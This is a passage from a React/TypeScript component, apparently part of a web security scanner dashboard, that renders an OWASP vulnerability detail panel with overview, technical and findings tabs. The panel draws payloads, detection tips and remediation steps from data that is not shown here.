                borderRadius: 8, padding: '4px 10px', fontFamily: 'monospace', fontWeight: 700,
                color: 'var(--accent2)', fontSize: 13 }}>
                {selected}
              </div>
              <div>
                <h2 style={{ fontSize: 16, fontWeight: 800, color: 'var(--text)', marginBottom: 2 }}>
                  {selectedDetail.fullName}
                </h2>
                <span style={{
                  fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 4,
                  background: `${selectedDetail.severityColor}18`,
                  color: selectedDetail.severityColor,
                  border: `1px solid ${selectedDetail.severityColor}35`,
                }}>
                  {selectedDetail.severity} Severity
                </span>
              </div>
            </div>
            <button className="btn btn-ghost btn-sm" onClick={() => setSelected(null)}>
              <X size={14} /> Close
            </button>
          </div>

          {/* Tabs */}
          <div style={{ display: 'flex', gap: 4, padding: '12px 0', borderBottom: '1px solid var(--border)' }}>
            {([
              ['overview',  'Overview',   BookOpen],
              ['technical', 'Technical',  Code],
              ['findings',  `Findings (${selectedOwasp.findings.length})`, Shield],
            ] as const).map(([tab, label, Icon]) => (
              <button key={tab} onClick={() => setDetailTab(tab as any)}
                className="btn btn-ghost btn-sm"
                style={{
                  borderBottom: detailTab === tab ? '2px solid var(--accent)' : '2px solid transparent',
                  borderRadius: 0, color: detailTab === tab ? 'var(--accent2)' : 'var(--text3)',
                  padding: '6px 14px',
                }}>
                <Icon size={13} /> {label}
              </button>
            ))}
          </div>

          {/* Tab Content */}
          <div style={{ paddingTop: 16 }}>

            {/* ── OVERVIEW TAB ── */}
            {detailTab === 'overview' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 14 }}>
                  {/* What is it */}
                  <div style={{ background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10, padding: 16 }}>
                    <p style={{ fontSize: 11, fontWeight: 700, color: 'var(--accent2)', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 8 }}>
                      📖 What is it?
                    </p>
                    <p style={{ fontSize: 13, color: 'var(--text2)', lineHeight: 1.7 }}>{selectedDetail.what}</p>
                  </div>
                  {/* Why it happens */}
                  <div style={{ background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10, padding: 16 }}>
                    <p style={{ fontSize: 11, fontWeight: 700, color: '#F97316', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 8 }}>
                      ⚠ Why it Happens
                    </p>
                    <p style={{ fontSize: 13, color: 'var(--text2)', lineHeight: 1.7 }}>{selectedDetail.why}</p>
                  </div>
                </div>
                {/* Impact */}
                <div style={{ background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 10, padding: 16 }}>
                  <p style={{ fontSize: 11, fontWeight: 700, color: '#EF4444', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 8 }}>
                    💥 Real-World Impact
                  </p>
                  <p style={{ fontSize: 13, color: 'var(--text2)', lineHeight: 1.7 }}>{selectedDetail.impact}</p>
                </div>
                {/* Scenario */}
                <div style={{ background: 'rgba(234,179,8,0.04)', border: '1px solid rgba(234,179,8,0.2)', borderRadius: 10, padding: 16 }}>
                  <p style={{ fontSize: 11, fontWeight: 700, color: '#EAB308', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 8 }}>
                    🎬 Real-World Scenario
                  </p>
                  <p style={{ fontSize: 13, color: 'var(--text2)', lineHeight: 1.7, fontStyle: 'italic' }}>{selectedDetail.scenario}</p>
                </div>
                {/* Attack Examples */}
                <div style={{ background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10, padding: 16 }}>
                  <p style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 10 }}>
                    🎯 Attack Examples
                  </p>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                    {selectedDetail.examples.map((ex, i) => (
                      <div key={i} style={{ display: 'flex', gap: 8, alignItems: 'flex-start' }}>
                        <span style={{ color: '#EF4444', fontSize: 12, fontWeight: 700, flexShrink: 0, marginTop: 1 }}>•</span>
                        <p style={{ fontSize: 13, color: 'var(--text2)', lineHeight: 1.5 }}>{ex}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* ── TECHNICAL TAB ── */}
            {detailTab === 'technical' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                {/* Sample Payloads */}
                <div style={{ background: '#04070F', border: '1px solid var(--border)', borderRadius: 10, padding: 16 }}>
                  <p style={{ fontSize: 11, fontWeight: 700, color: '#86EFAC', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 10 }}>
                    🔬 Safe Educational Payloads (for testing only)
                  </p>
                  {selectedDetail.payloads.map((pl, i) => (
                    <div key={i} style={{ fontFamily: 'monospace', fontSize: 12, color: '#F9FAFB', padding: '4px 0',
                      borderBottom: i < selectedDetail.payloads.length - 1 ? '1px solid rgba(255,255,255,0.06)' : 'none' }}>
                      <span style={{ color: '#94A3B8', marginRight: 8 }}>&gt;</span>{pl}
                    </div>
                  ))}
                </div>

                {/* Detection + Tools */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 14 }}>
                  <div style={{ background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10, padding: 16 }}>
                    <p style={{ fontSize: 11, fontWeight: 700, color: '#A855F7', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 10 }}>
                      🔍 Detection Techniques
                    </p>
                    {selectedDetail.detection.map((d, i) => (
                      <p key={i} style={{ fontSize: 12, color: 'var(--text2)', lineHeight: 1.6, marginBottom: 4 }}>• {d}</p>
                    ))}
                  </div>
                  <div style={{ background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10, padding: 16 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 10 }}>
                      <Wrench size={13} style={{ color: '#06B6D4' }} />
                      <p style={{ fontSize: 11, fontWeight: 700, color: '#06B6D4', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                        Recommended Tools
                      </p>
                    </div>
                    {selectedDetail.tools.map((t, i) => (
                      <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 }}>
                        <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#06B6D4', flexShrink: 0, display: 'inline-block' }} />
                        <p style={{ fontSize: 12, color: 'var(--text2)' }}>{t}</p>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Prevention + Best Practices */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 14 }}>
                  <div style={{ background: 'rgba(34,197,94,0.04)', border: '1px solid rgba(34,197,94,0.2)', borderRadius: 10, padding: 16 }}>
                    <p style={{ fontSize: 11, fontWeight: 700, color: '#22C55E', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 10 }}>
                      🛡 Prevention
                    </p>
                    {selectedDetail.prevention.map((p2, i) => (
                      <p key={i} style={{ fontSize: 12, color: 'var(--text2)', lineHeight: 1.6, marginBottom: 4 }}>• {p2}</p>
                    ))}
                  </div>
                  <div style={{ background: 'rgba(59,130,246,0.04)', border: '1px solid rgba(59,130,246,0.2)', borderRadius: 10, padding: 16 }}>
                    <p style={{ fontSize: 11, fontWeight: 700, color: 'var(--accent2)', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 10 }}>
                      ✅ Best Practices
                    </p>
                    {selectedDetail.bestPractices.map((bp2, i) => (
                      <p key={i} style={{ fontSize: 12, color: 'var(--text2)', lineHeight: 1.6, marginBottom: 4 }}>• {bp2}</p>
                    ))}
                  </div>
                </div>

                {/* Remediation Steps */}
                <div style={{ background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10, padding: 16 }}>
                  <p style={{ fontSize: 11, fontWeight: 700, color: '#F97316', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 10 }}>
                    🔧 Remediation Steps
                  </p>
                  {selectedDetail.remediation.map((r, i) => (
                    <p key={i} style={{ fontSize: 12, color: 'var(--text2)', fontFamily: 'monospace', lineHeight: 1.7, marginBottom: 4 }}>{r}</p>
                  ))}
                </div>

                {/* Secure Coding Tips */}
                <div style={{ background: '#04070F', border: '1px solid rgba(34,197,94,0.2)', borderRadius: 10, padding: 16 }}>
                  <p style={{ fontSize: 11, fontWeight: 700, color: '#86EFAC', textTransform: 'uppercase', letterSpacing: '0.5px', marginBottom: 10 }}>
                    💻 Secure Coding Tips
                  </p>
                  {selectedDetail.secureCoding.map((sc, i) => (
                    <div key={i} style={{ fontFamily: 'monospace', fontSize: 12, color: '#D8B4FE', padding: '3px 0',
                      borderBottom: i < selectedDetail.secureCoding.length - 1 ? '1px solid rgba(255,255,255,0.05)' : 'none' }}>
                      {sc}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* ── FINDINGS TAB ── */}
            {detailTab === 'findings' && (
              <div>
                {!selectedOwasp.findings.length ? (
                  <div style={{ textAlign: 'center', padding: '30px 0', color: 'var(--text3)' }}>
                    <AlertTriangle size={32} style={{ marginBottom: 10, opacity: 0.4 }} />
                    <p style={{ fontSize: 13 }}>No findings detected for {selected} in current scans.</p>
                    <p style={{ fontSize: 12, marginTop: 4, color: '#475569' }}>
                      Run a scan to discover {selectedDetail.fullName} vulnerabilities.
                    </p>
                  </div>
                ) : (
                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
                    <thead>
                      <tr>
                        {['Title', 'Endpoint', 'Severity', 'Risk', 'Confidence'].map(h => (
                          <th key={h} style={{ padding: '8px 10px', textAlign: 'left', fontSize: 10,
                            color: 'var(--text3)', fontWeight: 600, textTransform: 'uppercase',
                            borderBottom: '1px solid var(--border)' }}>{h}</th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {selectedOwasp.findings.map(f => (
                        <tr key={f.id} style={{ borderBottom: '1px solid var(--border)' }}
                          onMouseEnter={e => (e.currentTarget.style.background = 'var(--surface2)')}
                          onMouseLeave={e => (e.currentTarget.style.background = 'transparent')}>
                          <td style={{ padding: '9px 10px', color: 'var(--text)', fontWeight: 500,
                            maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{f.title}</td>
                          <td style={{ padding: '9px 10px', fontFamily: 'monospace', fontSize: 11,
                            color: '#60A5FA', maxWidth: 160, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{f.affected_url}</td>
                          <td style={{ padding: '9px 10px' }}><SevBadge sev={f.severity} /></td>
                          <td style={{ padding: '9px 10px', fontFamily: 'monospace', fontSize: 12, fontWeight: 700,
                            color: f.risk_score >= 7 ? '#EF4444' : f.risk_score >= 4 ? '#F97316' : '#EAB308' }}>
                            {Number(f.risk_score ?? 0).toFixed(1)}
                          </td>
                          <td style={{ padding: '9px 10px', fontFamily: 'monospace', fontSize: 11, color: 'var(--text2)' }}>
                            {(Number(f.confidence ?? 0) * 100).toFixed(0)}%
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
